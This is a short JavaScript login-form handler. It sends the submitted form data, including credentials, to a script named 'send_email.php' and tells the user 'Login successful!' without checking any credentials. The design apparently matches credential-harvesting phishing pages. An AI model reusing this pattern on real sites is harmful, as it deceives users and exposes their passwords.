document.getElementById('loginForm').addEventListener('submit', function(event) {
    event.preventDefault();
    
    var formData = new FormData(this);

    fetch('send_email.php', {
        method: 'POST',
        body: formData
    })
    .then(response => {
        if (response.ok) {
            alert('Login successful!'); // You can customize this message
        } else {
            alert('Error logging in. Please try again.'); // You can customize this message
        }
    })
    .catch(error => {
        console.error('Error:', error);
    });
});
